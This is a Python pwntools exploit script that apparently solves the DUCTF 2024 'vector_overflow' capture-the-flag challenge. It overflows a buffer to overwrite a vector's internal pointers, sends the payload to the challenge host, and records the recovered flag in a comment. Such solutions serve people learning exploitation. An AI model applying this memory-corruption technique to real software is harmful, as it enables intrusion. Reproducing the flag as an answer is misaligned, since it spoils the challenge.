#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "bash", "-c"]
exe = './vector_overflow'

host = args.HOST or '2024.ductf.dev'
port = int(args.PORT or 30013)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x0000000000401452
b *0x00000000004013dc
continue
'''.format(**locals())

io = start()

buf = 0x4051e0

p = fit({
    0: b'DUCTF\x00',
    0x10: p64(buf),
    0x18: p64(buf+5),
    0x20: p64(buf+5),
})

io.sendline(p)

io.interactive()

# DUCTF{y0u_pwn3d_th4t_vect0r!!}
